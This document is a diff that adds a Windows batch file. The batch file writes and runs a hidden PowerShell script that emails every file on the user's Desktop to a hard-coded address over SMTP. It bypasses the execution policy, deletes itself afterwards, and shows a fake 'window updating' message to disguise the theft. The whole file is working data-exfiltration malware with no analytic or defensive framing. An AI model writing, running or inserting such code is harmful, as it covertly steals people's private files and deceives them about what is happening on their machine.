@@ -1,0 +1,59 @@
+@echo off
+setlocal
+
+:: Define the temporary PowerShell script path
+set "psScript=%temp%\send-email.ps1"
+
+:: Write the PowerShell script content to the temporary file
+echo # Set the email parameters > "%psScript%"
+echo $EmailFrom = "abc@gmail.com" >> "%psScript%"
+echo $EmailTo = "123@gmail.com" >> "%psScript%"
+echo $Subject = "Files from Desktop" >> "%psScript%"
+echo $Body = "Attached are the files from the Desktop." >> "%psScript%"
+echo $SMTPServer = "smtp.outlook.com" >> "%psScript%"
+echo $SMTPPort = 587 >> "%psScript%"
+echo $SMTPUser = "abc@gmail.com" >> "%psScript%"
+echo $SMTPPass = "mypassword " >> "%psScript%"
+echo >> "%psScript%"
+echo # Create a new MailMessage object >> "%psScript%"
+echo $MailMessage = New-Object system.net.mail.mailmessage >> "%psScript%"
+echo $MailMessage.From = $EmailFrom >> "%psScript%"
+echo $MailMessage.To.Add($EmailTo) >> "%psScript%"
+echo $MailMessage.Subject = $Subject >> "%psScript%"
+echo $MailMessage.Body = $Body >> "%psScript%"
+echo >> "%psScript%"
+echo # Attach all files from the Desktop >> "%psScript%"
+echo $DesktopPath = [Environment]::GetFolderPath("Desktop") >> "%psScript%"
+echo $Files = Get-ChildItem -Path $DesktopPath >> "%psScript%"
+echo >> "%psScript%"
+echo foreach ($File in $Files^) { >> "%psScript%"
+echo     $Attachment = New-Object System.Net.Mail.Attachment($File.FullName) >> "%psScript%"
+echo     $MailMessage.Attachments.Add($Attachment) >> "%psScript%"
+echo } >> "%psScript%"
+echo >> "%psScript%"
+echo # Create and configure the SMTP client >> "%psScript%"
+echo $SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort) >> "%psScript%"
+echo $SMTPClient.EnableSsl = $true >> "%psScript%"
+echo $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($SMTPUser, $SMTPPass) >> "%psScript%"
+echo >> "%psScript%"
+echo # Send the email >> "%psScript%"
+echo try { >> "%psScript%"
+echo     $SMTPClient.Send($MailMessage) >> "%psScript%"
+echo     Write-Host "window updating......!" >> "%psScript%"
+echo } catch { >> "%psScript%"
+echo     Write-Host "Error: $_" >> "%psScript%"
+echo } >> "%psScript%"
+echo >> "%psScript%"
+echo # Clean up attachments >> "%psScript%"
+echo foreach ($Attachment in $MailMessage.Attachments^) { >> "%psScript%"
+echo     $Attachment.Dispose() >> "%psScript%"
+echo } >> "%psScript%"
+
+:: Execute the PowerShell script
+powershell -ExecutionPolicy Bypass -File "%psScript%"
+
+:: Clean up
+del "%psScript%"
+
+endlocal
+pause
